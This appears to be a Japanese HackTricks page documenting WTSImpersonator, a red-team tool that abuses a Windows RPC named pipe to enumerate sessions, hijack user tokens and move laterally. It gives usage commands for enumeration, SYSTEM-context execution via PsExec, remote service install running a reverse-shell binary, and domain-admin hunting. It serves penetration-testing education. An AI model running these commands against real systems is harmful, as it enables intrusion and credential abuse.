<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見る
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦で**フォロー**する：[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングトリックを共有するためにPRを提出して** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリに。

</details>

**WTS Impersonator**ツールは、**"\\pipe\LSM_API_service"** RPC名前付きパイプを悪用して、ログインしているユーザーを秘密裏に列挙し、トークンを乗っ取り、従来のトークン権限昇格技術をバイパスします。このアプローチにより、ネットワーク内でのシームレスな横断移動が可能となります。この技術の革新は、**Omri Baso**によるもので、その作業は[GitHub](https://github.com/OmriBaso/WTSImpersonator)でアクセス可能です。

### コア機能
このツールは、一連のAPI呼び出しを介して動作します：
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### キー モジュールと使用方法
- **ユーザーの列挙**: ツールを使用して、ローカルおよびリモートユーザーの列挙が可能です。それぞれのシナリオに対応するコマンドを使用します:
- ローカルでの実行:
```powershell
.\WTSImpersonator.exe -m enum
```
- IPアドレスまたはホスト名を指定してリモートでの実行:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **コマンドの実行**: `exec` および `exec-remote` モジュールは、**Service** コンテキストが必要です。ローカル実行では、WTSImpersonator実行可能ファイルとコマンドが必要です:
- ローカルコマンドの実行例:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- サービスコンテキストを取得するために PsExec64.exe を使用できます:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **リモートコマンドの実行**: PsExec.exe と同様に、適切な権限で実行を許可するサービスをリモートで作成およびインストールします。
- リモート実行の例:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **ユーザーハンティングモジュール**: 複数のマシンで特定のユーザーをターゲットにし、彼らの資格情報でコードを実行します。これは、複数のシステムでローカル管理者権限を持つドメイン管理者をターゲットにする際に特に有用です。
- 使用例:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```
